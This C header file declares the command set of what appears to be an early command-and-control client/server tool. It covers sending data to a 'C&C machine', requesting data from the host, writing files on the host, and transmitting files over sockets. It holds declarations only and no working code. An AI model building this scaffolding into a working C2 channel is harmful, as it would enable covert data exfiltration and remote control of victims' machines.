#ifndef cwb_commands_hdr
#define cwb_commands_hdr

/* Module model - restricted - TODO - v0.1
 * less restricted commands may be available in another module
 */

 #ifdef OS_WINDOWS
 #include <winsock2.h>
 #endif

 #ifdef OS_LINUX
 typedef int SOCKET; //for portability
 #endif

extern const char *command_strings[];

enum Commands {
  CMD_QUIT = 0,
  CMD_MESSAGE,    // send message to host machine
  CMD_SEND_DATA,  // send data to the C&C machine
  CMD_REQ_DATA,   // request data from the host machine
  CMD_DEPOSIT_TXT // store output to a specific text file on the host
};

struct Hashmap {
  char *key;           // This is the command as a str
  enum Commands value; // This is the enum corresponding to that str
};
/* end parse_command helper values */

/* Return is an error code, functionality is in the logic. */
int parse_command(const char *cmd);
int exec_command(enum Commands cmd, SOCKET conn, char *buf, size_t buflen);
int exec_command_server_side(SOCKET conn, enum Commands cmd, char *buf, size_t buflen);
struct Hashmap *create_hashmap();
int parse_command_hashmap(const char *cmd);
char xmit_file(FILE *fp, SOCKET conn, char *buf, size_t buflen);
char recv_file(FILE *fp_out, SOCKET conn, char *buf, size_t buflen);

#endif
